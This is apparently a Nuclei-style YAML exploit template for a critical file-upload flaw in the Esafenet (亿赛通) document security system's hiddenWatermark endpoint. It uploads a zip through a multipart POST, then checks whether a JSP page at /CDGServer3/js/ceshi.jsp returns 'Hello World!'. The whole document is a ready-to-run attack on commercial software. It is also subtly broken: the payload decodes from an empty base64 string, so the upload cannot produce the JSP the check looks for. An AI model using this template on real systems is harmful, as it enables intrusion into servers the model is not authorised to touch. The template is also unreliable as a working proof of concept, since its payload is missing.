id: poc-yaml-yisaitong-esafenet-hiddenWatermark-file-upload
info:
  name: 亿赛通电子文档安全管理系统 hiddenWatermark 文件上传漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: 文件上传
  description: |
    亿赛通电子文档安全管理系统存在文件上传漏洞，通过上传特定文件可实现漏洞利用。

variables:
  t1: "{{base64_decode('')}}"
  t2: "{{rand_base(5)}}"

flow: http(1) && http(2)

http:
  - id: hidden-watermark-upload
    method: POST
    path:
      - "{{BaseURL}}/CDGServer3/hiddenWatermark/uploadFile"
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycfadsmat
    body: |-
      ------WebKitFormBoundarycfadsmat
      Content-Disposition: form-data; name="doc"; filename="{{t2}}.zip"
      Content-Type: application/zip

      {{t1}}
      ------WebKitFormBoundarycfadsmat--
    matchers:
      - type: status
        status:
          - 200

  - id: ceshi-verification
    method: GET
    path:
      - "{{BaseURL}}/CDGServer3/js/ceshi.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Hello World!"
      - type: word
        words:
          - "<"
        negative: true
